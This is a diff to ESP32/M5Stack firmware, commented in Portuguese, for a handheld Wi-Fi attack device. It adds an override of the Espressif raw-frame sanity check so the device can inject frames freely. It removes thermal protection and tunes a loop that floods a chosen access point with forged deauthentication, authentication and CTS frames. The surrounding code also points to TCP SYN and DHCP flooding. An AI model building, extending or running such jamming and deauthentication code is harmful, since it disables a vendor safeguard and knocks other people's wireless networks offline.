@@ -15,9 +15,15 @@
 #include <atomic>
 #include <lwip/def.h> 
 #include <esp_heap_caps.h>
-#include "driver/temp_sensor.h" 
 #include "esp_random.h"
 #include "esp_log.h" 
+
+// ===================================================================
+// BYPASS DO FIREWALL DA ESPRESSIF (SANITY CHECK KILLER)
+// ===================================================================
+extern "C" __attribute__((used)) int ieee80211_raw_frame_sanity_check(int32_t arg1, int32_t arg2, int32_t arg3) {
+    return 0; // 0 significa "Pacote validado, pode disparar a injeção"
+}
 
 // ===================================================================
 // 1. ESTRUTURAS DE PACOTES (OTIMIZADAS PARA ACESSO DIRETO DMA)
@@ -213,7 +219,7 @@ void analisar_alvo_automaticamente(int indice_alvo) {
             estrategia_atual.store(ESTRATEGIA_SINAL_MEDIO); return;
         }
 
-        if (ap.authmode == WIFI_AUTH_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || ap.authmode == WIFI_AUTH_ENTERPRISE) {
+       if (ap.authmode == WIFI_AUTH_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || ap.authmode == WIFI_AUTH_WPA2_ENTERPRISE) {
             estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
         }
         else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
@@ -337,26 +343,8 @@ void task_display(void *pvParameters) {
                     }
                     M5.Display.printf("⚔️ ALVO: %s\n", alvo_ssid);
                     
-                    float tsens_out = 0.0;
-                    esp_err_t res = temp_sensor_read_celsius(&tsens_out);
-                    
-                    if (res == ESP_OK && tsens_out > 0.0 && tsens_out < 100.0) {
-                        if (tsens_out > 75.0 && !thermal_lock.load()) { 
-                            thermal_lock.store(true); 
-                            tx_power_max.store(false); 
-                            flag_update_config.store(true); 
-                        } 
-                        else if (tsens_out < 65.0 && thermal_lock.load()) { 
-                            thermal_lock.store(false); 
-                            tx_power_max.store(tx_power_max_user.load()); 
-                            flag_update_config.store(true); 
-                        }
-                    }
-                    
-                    if (thermal_lock.load()) M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-                    else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-                    
-                    M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");
+                    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
+                    M5.Display.printf("CH: %d | TEMP: N/A | %s\n", canal_atual_alvo.load(), tx_power_max.load() ? "MAX" : "ECO");
 
                     M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK);
                     M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
@@ -364,8 +352,6 @@ void task_display(void *pvParameters) {
                     else M5.Display.printf("> %s\n", get_nome_modo());
                     
                     M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
-                    
-                    // CORREÇÃO DO %lu para %u para o compilador v4.4
                     M5.Display.printf(">> INJETANDO: %u PPS <<\n",  (unsigned int)pps_atual.load());
                 } else {
                     M5.Display.fillRect(0, 40, 320, 60, TFT_BLACK); 
@@ -514,7 +500,7 @@ void task_ataque(void *pvParameters) {
                     auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                     deauth->reason_code = reason_codes[fast_rand() % 5];
                     
-                    if(esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) local_pps++;
+if(esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) local_pps++;
                     if(esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) local_pps++;
                 }
             }
@@ -523,6 +509,16 @@ void task_ataque(void *pvParameters) {
                 if(esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) local_pps++;
             }
 
+            // === CÓDIGO ANTITRAVAMENTO (WATCHDOG) ===
+            static uint32_t contador_tiros = 0;
+            contador_tiros++;
+            // A cada 50 ciclos de injeção, libera a CPU 0 por 1 tick (milissegundo)
+            if (contador_tiros % 50 == 0) {
+                vTaskDelay(pdMS_TO_TICKS(1));
+            }
+            // ========================================
+
+        } // <-- Fim do while (estado_atual.load() == ESTADO_ATIRAR)
             if (atirar_l3) {
                 int chance_tcp_syn = 6; int chance_dhcp = 2;  
 
@@ -666,6 +662,7 @@ void task_controles(void *pvParameters) {
     while (true) {
         M5.update(); 
         
+        // --- 1. LEITURA DO TECLADO FÍSICO (TCA8418) ---
         uint8_t ec = M5.In_I2C.readRegister8(TCA8418_ADDR, TCA8418_KEY_LCK_EC, 400000);
         uint8_t count = ec & 0x0F; 
         
@@ -675,14 +672,22 @@ void task_controles(void *pvParameters) {
             uint8_t keycode = event & 0x7F; 
             
             if (pressed) {
-                ESP_LOGW("TECLADO", ">>> TECLA PRESSIONADA! ID: %d <<<", keycode);
-                
                 if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
-                    if (keycode == 58) { 
+                    if (keycode == 58) { // Tecla de navegação (para baixo)
                         alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
                         desenhar_menu();
                     }
-                    else if (keycode == 67) { 
+                    // --- TOGGLE DE POTÊNCIA MANUAL (Tecla 'p' = keycode 112) ---
+                if (keycode == 112) {
+                    bool current_pwr = tx_power_max.load();
+                    tx_power_max.store(!current_pwr);
+                    flag_update_config.store(true); // Avisa a task de ataque para mudar a potência do rádio
+                    if (estado_atual.load() == ESTADO_SELECIONAR) {
+                        desenhar_menu();
+                    }
+                    ESP_LOGI("TECLADO", "Potencia alterada para: %s", tx_power_max.load() ? "MAX" : "ECO");
+                }
+                    else if (keycode == 67) { // Tecla Enter (Atirar)
                         uint8_t ch = 1;
                         if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) {
                             ch = alvos_encontrados[alvo_selecionado].primary;
@@ -697,7 +702,7 @@ void task_controles(void *pvParameters) {
                     }
                 }
                 else if (estado_atual.load() == ESTADO_ATIRAR) {
-                    if (keycode == 97) { 
+                    if (keycode == 97) { // Tecla Voltar/Esc (Parar Ataque)
                         alvo_perdido.store(false); 
                         estado_atual.store(ESTADO_SELECIONAR); 
                         escanear_redes(); 
@@ -708,9 +713,12 @@ void task_controles(void *pvParameters) {
             count--;
         }
         
-        // BACKUP: Botão lateral G0
+        // --- 2. BACKUP: BOTÃO LATERAL G0 (M5.BtnA) ---
         if (estado_atual.load() == ESTADO_SELECIONAR && total_alvos > 0) {
-            if (M5.BtnA.wasPressed()) { alvo_selecionado = (alvo_selecionado + 1) % total_alvos; desenhar_menu(); }
+            if (M5.BtnA.wasPressed()) { 
+                alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
+                desenhar_menu(); 
+            }
             if (M5.BtnA.pressedFor(1000)) {
                 uint8_t ch = 1;
                 if(xSemaphoreTake(scan_mutex, portMAX_DELAY)) { ch = alvos_encontrados[alvo_selecionado].primary; xSemaphoreGive(scan_mutex); }
@@ -754,12 +762,8 @@ extern "C" void app_main(void) {
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_start(); 
     esp_wifi_set_ps(WIFI_PS_NONE); 
-    
-    // Inicialização do Sensor de Temperatura no ESP-IDF v4.4
-    temp_sensor_config_t temp_sensor = TSENS_CONFIG_DEFAULT();
-    temp_sensor_set_config(temp_sensor);
-    temp_sensor_start();
 
+    // Inicialização de tarefas
     xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
     xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
     xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
